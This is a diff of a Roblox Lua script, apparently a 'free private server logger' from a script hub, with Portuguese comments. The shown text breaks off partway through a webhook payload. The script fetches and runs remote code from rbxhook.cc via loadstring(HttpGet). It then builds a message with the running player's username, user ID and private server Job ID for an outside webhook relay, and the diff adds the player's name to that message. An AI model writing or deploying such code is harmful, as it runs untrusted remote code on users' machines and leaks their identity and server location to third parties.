@@ -1,11 +1,11 @@
 getgenv().Config = {api = "9f3f28c6e7538b4d8e3cac724bb8a6a57bdbcdeb956804680745e04f9eb1585f"} -- DO NOT CHANGE
 
-loadstring(game:HttpGet("[https://rbxhook.cc/lua/track.lua](https://rbxhook.cc/lua/track.lua)"))()
+loadstring(game:HttpGet("https://rbxhook.cc/lua/track.lua"))()
 
 local player = game:GetService("Players").LocalPlayer
 local HttpService = game:GetService("HttpService")
 
-local url = "[https://rbxhook.cc/r/5b8eb61e1c6371c991672e07144be2bb](https://rbxhook.cc/r/5b8eb61e1c6371c991672e07144be2bb)"
+local url = "https://rbxhook.cc/r/5b8eb61e1c6371c991672e07144be2bb"
 
 local serverRegion = "Unknown"
 pcall(function()
@@ -13,10 +13,10 @@ pcall(function()
 end)
 
 -- Pegando o link oficial do AvatarBurst do jogador para o ícone do embed
-local avatarBurstUrl = "[https://www.roblox.com/headshot-thumbnail/image?userId=](https://www.roblox.com/headshot-thumbnail/image?userId=)" .. tostring(player.UserId) .. "&width=150&height=150&format=png"
+local avatarBurstUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=150&height=150&format=png"
 
 local data = {
-    avatar_url = "[https://image2url.com/images/1765321843919-d6a101a5-e511-4c74-8cc4-2dc979ceddbc.png](https://image2url.com/images/1765321843919-d6a101a5-e511-4c74-8cc4-2dc979ceddbc.png)",
+    avatar_url = "https://image2url.com/images/1765321843919-d6a101a5-e511-4c74-8cc4-2dc979ceddbc.png",
     content = "",
     username = "Galaxy's Hub | free private server logger",
     embeds = {
@@ -28,10 +28,15 @@ local data = {
                 icon_url = avatarBurstUrl
             },
             thumbnail = {
-                url = "[https://www.roblox.com/headshot-thumbnail/image?userId=](https://www.roblox.com/headshot-thumbnail/image?userId=)" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
             },
             fields = {
-                -- Apenas o Job ID isolado com crases para cópia rápida no celular
+                -- Nome do criador e Job ID isolado na caixinha de código
+                {
+                    name = "Server Creator",
+                    value = player.Name,
+                    inline = false
+                },
                 {
                     name = "Job ID",
                     value = "```\n" .. game.JobId .. "\n```",
